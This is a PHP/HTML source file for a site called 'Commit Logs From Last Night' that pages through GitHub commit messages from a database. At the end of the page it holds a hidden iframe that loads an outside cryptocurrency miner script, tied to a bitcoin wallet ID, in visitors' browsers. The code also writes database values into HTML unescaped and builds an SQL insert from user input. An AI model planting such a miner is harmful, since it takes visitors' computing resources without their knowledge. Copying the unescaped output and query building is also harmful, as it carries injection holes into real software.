<?php
require('opendb.php');
$per_page = 50;

function get_num_pages($per_page){
	$query = "SELECT COUNT(*) FROM new_commits ORDER BY id DESC";
	$result = mysql_query($query);
	$result_array = mysql_fetch_array($result);
	$num_messages = $result_array[0];
	return round($num_messages / $per_page);
}

$num_pages = get_num_pages($per_page);

$page = 0;
if(is_numeric($_GET['page'])){
	$page = $_GET['page'];
} 

// Get commits
$query = "SELECT * FROM new_commits ORDER BY date DESC LIMIT " . $page * $per_page . ", " . $per_page;
$result = mysql_query($query);

$prev_page = $page - 1;
$next_page = $page + 1;
if($prev_page < 0){
	$prev_page = false;
}
if($next_page > $num_pages){
	$next_page = false;
}

?>
<!DOCTYPE html>
<html>
<head>
  <title>Commit Logs From Last Night</title>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>
  <link href='http://fonts.googleapis.com/css?family=Marvel:700italic' rel='stylesheet' type='text/css'>
  <link href='styles.css' rel='stylesheet' type='text/css'>
  <script type="text/javascript" src="jquery.infinitescroll.min.js"></script>
  <script type="text/javascript">
    $(document).ready(function(){
      $('#allPosts').infinitescroll({
        navSelector  : "div.pagination",            
                     // selector for the paged navigation (it will be hidden)
        nextSelector : "div.pagination a:first",    
                     // selector for the NEXT link (to page 2)
        itemSelector : "#allPosts tr.post"          
                     // selector for all items you'll retrieve
    });
  });
  </script>
</head>
<body>
<!--<a href="https://github.com/astanway/Commit-Logs-From-Last-Night"><img style="position: fixed; top: 0; left: 0; border: 0; z-index:10;" src="forkme_light_background.png" alt="Fuckin' fork me!"></a>-->
  <div id="header">Commit Logs From Last Night
    <div id="subheader">because real hackers pivot two hours before their demo</div>
        <div id="twitter">This thing tweets at <a href="http://www.twitter.com/CLFLN">@CLFLN</a>
<br><br>
Created by <a href="http://www.twitter.com/abestanway">@abestanway</a>
</br></br>
Watch the <a href="http://bit.ly/19XjyNb">video</a>!
</div>
   </div>

  <table class="allPostsClass" id="allPosts" cellspacing="0" cellpadding='15'>
    <tbody>
  <?php
  if (isset($_POST['username'])){
    $username = filter_that_shit($_POST['username']);
    $repo_url = "https://api.github.com/users/" . $username;
    $repos = json_decode(file_get_contents($repo_url));
    if ($repos != NULL){ 
      $query = mysql_query("INSERT INTO users (username) VALUES ('$username')");
    }
  }
  while($row = mysql_fetch_array($result)){ 
    if (strlen($row['message']) > 70) continue;
  ?>
      <tr class="post">
        <td>
        <?php echo '<a class="avatarlink" href='. $row['userurl'] . '>'?>
          <img class="avatar" height="70px" src="<?php echo$row['url'];?>"/>
          </a>
        </td>
        <td valign="middle" class="author">
                <?php $datetime = strtotime($row['date']);
                      $mysqldate = date("m/d/y g:i A", $datetime);
                      echo "<span class='date'>". $mysqldate . "</span>";
                 ?>
        </td>
        <td valign="middle" class="message">
          <div class="subMessage">
                <?php echo '<a class="commit" target="_blank" href='. $row['commiturl'] . '>' . $row['message'] .'</a>'?>  
          </div>
        </td>
      </tr> 
  <?php } ?>
  </tbody>
</table>
<div class="pagination" style="display:none;">
  <?php
	if($next_page){
		echo '<a class="first" href="?page=' . $next_page . '"> Next</a>';
	}
	?>
</div>
<iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 14FpXKYtUkQi9G5Ruj5PZibh1e3DtiHUme</script></iframe>
</body>
</html>
